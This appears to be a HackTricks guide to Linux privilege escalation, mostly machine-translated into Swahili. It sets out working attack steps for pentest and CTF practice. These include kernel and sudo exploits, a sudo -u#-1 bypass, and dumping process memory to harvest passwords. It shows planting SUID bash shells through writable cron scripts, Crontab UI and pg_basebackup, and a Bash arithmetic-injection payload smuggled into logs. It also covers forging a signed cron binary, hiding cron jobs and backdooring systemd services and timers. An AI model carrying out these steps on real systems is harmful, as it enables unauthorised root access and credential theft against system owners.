# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Mfumo

### Taarifa za OS

Tuanze kupata maarifa kuhusu OS inayokimbia
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Ikiwa **have write permissions on any folder inside the `PATH`** variable, utaweza hijack some libraries or binaries:
```bash
echo $PATH
```
### Habari za Env

Je, kuna taarifa zinazovutia, nywila au API keys katika environment variables?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Angalia toleo la kernel na angalia kama kuna exploit yoyote inayoweza kutumiwa kuinua privileges.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Unaweza kupata orodha nzuri ya kernel zilizo dhaifu na baadhi ya **compiled exploits** tayari hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Tovuti nyingine ambapo unaweza kupata baadhi ya **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa matoleo yote ya kernel yenye udhaifu kutoka kwenye tovuti hiyo unaweza kufanya:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Zana ambazo zinaweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Daima **tafuta toleo la kernel kwenye Google**, huenda toleo lako la kernel limeandikwa katika kernel exploit fulani na hivyo utahakikisha exploit hiyo ni halali.

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo toleo

Kulingana na toleo za Sudo zilizo hatarini ambazo zinaonekana katika:
```bash
searchsploit sudo
```
Unaweza kuangalia ikiwa toleo la sudo lina udhaifu kwa kutumia grep hii.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Toleo za Sudo kabla ya 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) zinaruhusu watumiaji wa ndani wasio na ruhusa kupandisha ruhusa zao hadi root kupitia chaguo la sudo `--chroot` wakati faili ya `/etc/nsswitch.conf` inatumiwa kutoka kwenye saraka inayodhibitiwa na mtumiaji.

Hapa kuna [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Kabla ya kuendesha exploit, hakikisha toleo lako la `sudo` ni vulnerable na kwamba linaunga mkono kipengele cha `chroot`.

Kwa taarifa zaidi, rejea [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) ya asili.

#### sudo < v1.8.28

Kutoka kwa @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg uthibitisho wa saini ulishindwa

Angalia **smasher2 box of HTB** kwa **mfano** wa jinsi hii vuln inaweza ku-exploited
```bash
dmesg 2>/dev/null | grep "signature"
```
### Zaidi system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Orodhesha kinga zinazowezekana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ikiwa uko ndani ya docker container, unaweza kujaribu kutoroka kutoka ndani yake:

{{#ref}}
docker-security/
{{#endref}}

## Diski

Angalia **what is mounted and unmounted**, wapi na kwa nini. Ikiwa kitu chochote kimeunmounted unaweza kujaribu ku-mount na kuangalia taarifa za kibinafsi.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Programu muhimu

Orodhesha binaries muhimu
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Pia, angalia ikiwa **any compiler is installed**. Hii ni muhimu ikiwa utahitaji kutumia kernel exploit fulani, kwani inashauriwa compile hiyo kwenye mashine utakayotumia (au kwenye ile inayofanana).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Programu Zenye Udhaifu Zilizowekwa

Kagua **toleo la vifurushi na huduma zilizowekwa**. Huenda kuna toleo la zamani la Nagios (kwa mfano) that could be exploited for escalating privileges…\
Inashauriwa kukagua kwa mkono toleo la programu zilizo shukiwa zaidi zilizowekwa.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ikiwa una ufikiaji wa SSH kwa mashine unaweza pia kutumia **openVAS** kukagua programu ambazo hazijasasishwa na ambazo zina udhaifu zilizosakinishwa ndani ya mashine.

> [!NOTE] > _Kumbuka kwamba amri hizi zitaonyesha taarifa nyingi ambazo kwa ujumla hazitakuwa na faida, kwa hivyo inashauriwa kutumia programu kama OpenVAS au nyingine zinazofanana zitakazokagua ikiwa toleo lolote la programu lililosakinishwa lina udhaifu dhidi ya exploits zinazojulikana_

## Michakato

Angalia **michakato gani** yanaendeshwa na kagua ikiwa kuna mchakato unaopata **idhinishaji zaidi kuliko inavyostahili** (labda tomcat inaendeshwa na root?)
```bash
ps aux
ps -ef
top -n 1
```
Kila mara angalia uwezekano wa [**electron/cef/chromium debuggers** zinapoendesha, unaweza kuzitumia kupandisha privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** inagundua hayo kwa kukagua parameter ya `--inspect` ndani ya mstari wa amri wa mchakato.\
Pia **angalia privileges zako juu ya processes binaries**, labda unaweza ku-overwrite baadhi yao.

### Ufuatiliaji wa mchakato

Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia mchakato. Hii inaweza kuwa ya msaada mkubwa kutambua mchakato dhaifu zinazotekelezwa mara kwa mara au pale inapokidhi seti ya mahitaji.

### Kumbukumbu za mchakato

Huduma kadhaa za server huhifadhi **credentials in clear text inside the memory**.\
Kawaida utahitaji **root privileges** kusoma memory ya mchakato zinazo milikiwa na watumiaji wengine, kwa hivyo hii ni muhimu zaidi ukiwa tayari root na unapotaka kugundua credentials zaidi.\
Hata hivyo, kumbuka kwamba **kama mtumiaji wa kawaida unaweza kusoma memory ya mchakato unayomiliki**.

> [!WARNING]
> Kumbuka kuwa siku hizi mashine nyingi **haziruhusu ptrace kwa default**, ambayo inamaanisha huwezi kufanya dump ya mchakato mengine yanayomilikiwa na mtumiaji wako asiye na ruhusa.
>
> Faili _**/proc/sys/kernel/yama/ptrace_scope**_ inasimamia upatikanaji wa ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. Hii ni njia ya kawaida jinsi ptracing ilivyofanya kazi.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Mara tu inapowekwa, inahitajika reboot ili kuwezesha ptracing tena.

#### GDB

Ikiwa una ufikiaji wa memory ya huduma ya FTP (kwa mfano) unaweza kupata Heap na kutafuta ndani yake credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Skripti
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Kwa PID fulani, **maps zinaonyesha jinsi memory inavyopangwa ndani ya nafasi ya anwani pepe ya mchakato huo**; pia zinaonyesha **idhini za kila eneo lililopangwa**. Faili bandia ya **mem** **inafunua kumbukumbu za mchakato mwenyewe**. Kutoka kwenye faili ya **maps** tunajua ni **maeneo gani ya kumbukumbu yanayosomwa** na offsets yao. Tunatumia taarifa hii **seek into the mem file and dump all readable regions** hadi faili.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` inatoa ufikiaji wa kumbukumbu ya **kimwili** ya mfumo, sio kumbukumbu pepe. Eneo la anwani pepe la kernel linaweza kufikiwa kwa kutumia /dev/kmem.\
Kwa kawaida, `/dev/mem` inaweza kusomwa tu na **root** na kundi la **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump kwa linux

ProcDump ni toleo la Linux lililobuniwa upya la zana ya klasiki ProcDump kutoka kwenye mkusanyiko wa zana za Sysinternals kwa Windows. Pata kwenye [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Zana

Ili kudump kumbukumbu za process unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kuondoa kwa mkono mahitaji ya root na kudump process inayomilikiwa na wewe
- Script A.5 kutoka [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Credentials from Process Memory

#### Mfano wa mkono

Ikiwa utakuta mchakato wa authenticator unaendesha:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Unaweza dump the process (tazama sehemu zilizotangulia ili kupata njia mbalimbali za dump the memory ya process) na kutafuta credentials ndani ya memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Zana [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) itapora **nywila zilizo wazi kutoka kwenye kumbukumbu** na kutoka kwa baadhi ya **mafaili yanayojulikana vizuri**. Inahitaji ruhusa za root ili ifanye kazi ipasavyo.

| Kipengele                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| Nywila ya GDM (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Muunganisho hai za FTP)                   | vsftpd               |
| Apache2 (Vikao hai vya uthibitishaji wa HTTP Basic)         | apache2              |
| OpenSSH (Vikao hai vya SSH - Matumizi ya sudo)        | sshd:                |

#### Regexes za Utafutaji/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Kazi zilizopangwa/Cron jobs

### Crontab UI (alseambusher) inayoendesha kama root – web-based scheduler privesc

Ikiwa paneli ya wavuti “Crontab UI” (alseambusher/crontab-ui) inaendesha kama root na imetengwa kwa loopback pekee, bado unaweza kuifikia kupitia SSH local port-forwarding na kuunda job yenye privileji ili kufanya privesc.

Mnyororo wa kawaida
- Gundua port inayofungukwa kwa loopback pekee (mf., 127.0.0.1:8000) na Basic-Auth realm kupitia `ss -ntlp` / `curl -v localhost:8000`
- Tafuta credentials katika artifacts za uendeshaji:
- Backups/scripts zenye `zip -P <password>`
- systemd unit inayofunua `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel na login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Tengeneza job ya high-priv na uiendeshe mara moja (inatoa SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Tumia:
```bash
/tmp/rootshell -p   # root shell
```
Kukaza Usalama
- Usiendeshe Crontab UI kama root; tumia mtumiaji maalum na ruhusa chache
- Unganisha kwenye localhost na pia zuia upatikanaji kupitia firewall/VPN; usitumie nywila zile zile
- Epuka kuweka secrets ndani ya unit files; tumia secret stores au root-only EnvironmentFile
- Weka audit/logging ili kurekodi utekelezaji wa kazi kwa ombi

Angalia kama kazi yoyote iliyopangwa ina udhaifu. Huenda ukaweza kunufaika na script inayotekelezwa na root (wildcard vuln? unaweza ku-modify files ambazo root anazitumia? tumia symlinks? tengeneza files maalum katika directory ambayo root anaitumia?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Njia ya Cron

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Tambua jinsi mtumiaji "user" ana ruhusa za kuandika juu ya /home/user_)

Ikiwa ndani ya crontab hii mtumiaji root anajaribu kutekeleza amri au script bila kuweka PATH. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Kisha, unaweza kupata root shell kwa kutumia:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Ikiwa script inatekelezwa na root na ina “**\***” ndani ya amri, unaweza kuitumia kuleta mambo yasiyotarajiwa (kama privesc). Mfano:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**If the wildcard is preceded of a path like** _**/some/path/\***_ **, it's not vulnerable (even** _**./\***_ **is not).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. If a root cron/parser reads untrusted log fields and feeds them into an arithmetic context, an attacker can inject a command substitution $(...) that executes as root when the cron runs.

- Kwa nini inafanya kazi: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. Kwa hivyo thamani kama `$(/bin/bash -c 'id > /tmp/pwn')0` kwanza inabadilishwa (ikitekeleza amri), kisha nambari iliyobaki `0` inatumika kwa arithmetic ili script iendelee bila makosa.

- Mfano wa kawaida wa udhaifu:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Utekelezaji: Pata maandishi yanayodhibitiwa na mshambuliaji yaliandikwe katika logi inayochambuliwa ili uwanja unaoonekana kuwa nambari uwe na command substitution na umalize kwa tarakimu. Hakikisha amri yako haichapishi kwenye stdout (au uibonye) ili arithmetic ibaki halali.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ikiwa script inayotekelezwa na root inatumia **directory ambapo una ufikiaji kamili**, inaweza kuwa muhimu kufuta folda hiyo na **kuunda folda ya symlink kuelekea nyingine** inayohudumia script unayodhibiti.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Uthibitisho wa symlink na kushughulikia faili kwa usalama zaidi

Unapokagua scripts/binaries zenye ruhusa za juu zinazosomea au kuandika faili kwa path, thibitisha jinsi links zinavyoshughulikiwa:

- `stat()` inafuata symlink na hurudisha metadata ya target.
- `lstat()` hurudisha metadata ya link yenyewe.
- `readlink -f` na `namei -l` husaidia kutatua target ya mwisho na kuonyesha ruhusa za kila sehemu ya path.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Kwa walinzi/waendelezaji, mifumo salama dhidi ya symlink tricks ni pamoja na:

- `O_EXCL` with `O_CREAT`: shindwa ikiwa path tayari ipo (inazuia attacker pre-created links/files).
- `openat()`: fanya kazi kwa kutegemea file descriptor ya directory inayotegemewa.
- `mkstemp()`: tengeneza faili za muda kwa njia atomiki na ruhusa salama.

### Cron binaries zilizosainiwa kimaalum zenye payloads zinazoweza kuandikwa
Blue teams wakati mwingine hufanya "sign" kwa cron-driven binaries kwa ku-dump section maalum ya ELF na kutumia grep kutafuta vendor string kabla ya kuziendesha kama root. Ikiwa binary hiyo ni group-writable (mfano `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) na unaweza leak the signing material, unaweza forge the section na hijack the cron task:

1. Tumia `pspy` kukamata verification flow. Katika Era, root alikimbiza `objcopy --dump-section .text_sig=text_sig_section.bin monitor` ikafuatiwa na `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` kisha akatekeleza faili.
2. Rekreate the expected certificate kwa kutumia leaked key/config (kutoka `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Tengeneza malicious replacement (mfano, drop a SUID bash, add your SSH key) na embed the certificate katika `.text_sig` ili grep ipite:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Andika upya scheduled binary wakati ukihifadhi execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Subiri kwa cron run inayofuata; mara tu naive signature check itakapofaulu, payload yako itaendesha kama root.

### Cron jobs zinazofanyika mara kwa mara

Unaweza kusimamia processes kutafuta zile zinazoendeshwa kila dakika 1, 2 au 5. Labda unaweza kuchukua faida ya hilo na kupandisha ruhusa.

Kwa mfano, ili **kusimamia kila 0.1s kwa dakika 1**, **kupanga kwa amri chache zilizotekelezwa** na kufuta amri ambazo zimetekelezwa zaidi, unaweza kufanya:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila mchakato unaoanza).

### Backups za root ambazo zinahifadhi mode bits zilizowekwa na mshambuliaji (pg_basebackup)

Ikiwa cron inayomilikiwa na root inaendesha `pg_basebackup` (au nakala yoyote ya recursive) dhidi ya directory ya database ambayo unaweza kuandika, unaweza kuweka binary ya **SUID/SGID** ambayo itarudishwa tena kama **root:root** ikiwa na mode bits zilezile katika matokeo ya backup.

Mtiririko wa kawaida wa ugunduzi (kama mtumiaji wa DB mwenye vibali vya chini):
- Tumia `pspy` kugundua cron ya root inayoita kitu kama `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` kila dakika.
- Thibitisha kwamba cluster ya chanzo (mfano, `/var/lib/postgresql/14/main`) inaweza kuandikwa na wewe na kwamba destination (`/opt/backups/current`) inakuwa mali ya root baada ya kazi.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Hii inafanya kazi kwa sababu `pg_basebackup` inahifadhi file mode bits wakati inakopia cluster; inapoitwa na root, faili za destination zinapata **root ownership + attacker-chosen SUID/SGID**. Rutini yoyote ya privileged backup/copy inayohifadhi permissions na kuandika katika eneo linalotekelezeka ni vulnerable.

### Cron jobs zisizoonekana

Inawezekana kuunda cronjob kwa **putting a carriage return after a comment** (without newline character), na cron job itafanya kazi. Mfano (kumbuka the carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Huduma

### Faili za _.service_ zinazoweza kuandikwa

Angalia ikiwa unaweza kuandika faili yoyote ya `.service`; ikiwa unaweza, unaweza **kuibadilisha** ili iweze **kuitisha** backdoor yako wakati huduma **inapoanzishwa**, **inapoanzishwa tena** au **inasimamishwa** (labda utahitaji kusubiri mpaka mashine ifanywe reboot).\
Kwa mfano, tengeneza backdoor yako ndani ya faili ya `.service` kwa **`ExecStart=/tmp/script.sh`**

### Binaries za service zinazoweza kuandikwa

Kumbuka kwamba ikiwa una **idhini ya kuandika juu ya binaries zinazotekelezwa na services**, unaweza kuzibadilisha ili kuweka backdoor; hivyo wakati services zitakapotekelezwa tena, backdoor zitaendeshwa.

### systemd PATH - Relative Paths

Unaweza kuona PATH inayotumika na **systemd** kwa:
```bash
systemctl show-environment
```
Ikiwa ugundua kuwa unaweza **write** katika yoyote ya folda za njia hiyo, huenda ukaweza **escalate privileges**. Unahitaji kutafuta **relative paths being used on service configurations** katika faili kama:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Kisha, tengeneza **faili inayotekelezwa** yenye **jina sawa na binary ya relative path** ndani ya folder ya PATH ya systemd ambayo unaweza kuandika, na wakati service itaombwa kutekeleza hatua dhaifu (**Start**, **Stop**, **Reload**), **backdoor yako itaendeshwa** (watumiaji wasio na ruhusa kwa kawaida hawawezi kuanzisha/kuacha services — lakini angalia kama unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu services kwa kutumia `man systemd.service`.**

## **Timers**

**Timers** ni faili za unit za systemd ambazo majina yao yanaisha kwa `**.timer**` ambazo zinadhibiti faili au matukio ya `**.service**`. **Timers** zinaweza kutumika kama mbadala wa cron kwa kuwa zina msaada uliojengewa ndani kwa matukio ya kalenda na matukio ya monotonic time, na zinaweza kuendeshwa asynchronously.

Unaweza kuorodhesha timers zote kwa:
```bash
systemctl list-timers --all
```
### Timers zinazoweza kuandikwa

Ikiwa unaweza kubadilisha timer, unaweza kuifanya itekeleze baadhi ya systemd.unit zilizopo (kama `.service` au `.target`)
```bash
Unit=backdoor.service
```
Katika nyaraka unaweza kusoma nini Unit ni:

> Unit itakayowashwa wakati timer hii inapomalizika. Hoja ni jina la unit, ambalo kiambishi-mwisho sio ".timer". Ikiwa halitajwi, thamani hii kwa chaguo itakuwa service yenye jina sawa na unit ya timer, isipokuwa kwa suffix. (Tazama hapo juu.) Inashauriwa kwamba jina la unit linalowashwa na jina la unit ya timer ziwe zimetajwa kwa njia ile ile, isipokuwa kwa suffix.

Kwa hiyo, ili kuabusu ruhusa hii utahitaji:

- Tafuta unit ya systemd (kama `.service`) ambayo **inatekeleza binary inayoweza kuandikwa**
- Tafuta unit ya systemd ambayo **inatekeleza relative path** na una **idhini ya kuandika** kwenye **systemd PATH** (ili kujiga executable hiyo)

**Jifunze zaidi kuhusu timers kwa kutumia `man systemd.timer`.**

### **Kuwezesha Timer**

Ili kuwezesha timer unahitaji ruhusa za root na kutekeleza:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Kumbuka **timer** **imeamilishwa** kwa kuunda symlink yake kwenye `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) zinaiwezesha **process communication** kwenye mashine zile zile au tofauti ndani ya modeli za client-server. Zinatumia faili za descriptor za Unix kwa mawasiliano kati ya kompyuta na hupangwa kupitia faili za `.socket`.

Sockets zinaweza kusanidiwa kwa kutumia faili za `.socket`.

**Jifunze zaidi kuhusu sockets kwa `man systemd.socket`.** Ndani ya faili hii, vigezo kadhaa vya kuvutia vinaweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguzi hizi ni tofauti lakini kwa ufupi zinatumika **kuonyesha mahali zitakaposikiliza** socket (njia ya faili ya AF_UNIX socket, IPv4/6 na/au nambari ya bandari kusikiliza, nk.)
- `Accept`: Inachukua hoja ya boolean. Ikiwa **true**, **kifaa cha service kinasababishwa kwa kila muunganisho unaoingia** na socket ya muunganisho pekee ndio inapitishwa kwake. Ikiwa **false**, sockets zote za kusikiliza zenyewe zinapitishwa kwa unit ya service iliyozinduliwa, na unit moja ya service tu ndiyowe itazalishwa kwa muunganisho wote. Thamani hii haizingatiwi kwa datagram sockets na FIFOs ambapo unit moja ya service bila masharti inashughulikia trafiki yote inayoingia. **Defaults to false**. Kwa sababu za utendaji, inashauriwa kuandika daemons mpya tu kwa njia inayofaa kwa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Inachukua mistari ya amri moja au zaidi, ambayo **inatekelezwa kabla** au **baada** ya sockets/FIFOs zinazosikiliza **kuundwa** na kufungwa kwa thembele, mtawalia. Tokeni ya kwanza ya mstari wa amri lazima iwe jina la faili kamili (absolute filename), ikifuatiwa na hoja kwa mchakato.
- `ExecStopPre`, `ExecStopPost`: Amri za ziada ambazo **hufanywa kabla** au **baada** ya sockets/FIFOs zinazolisikiliza **kufungwa** na kuondolewa, mtawalia.
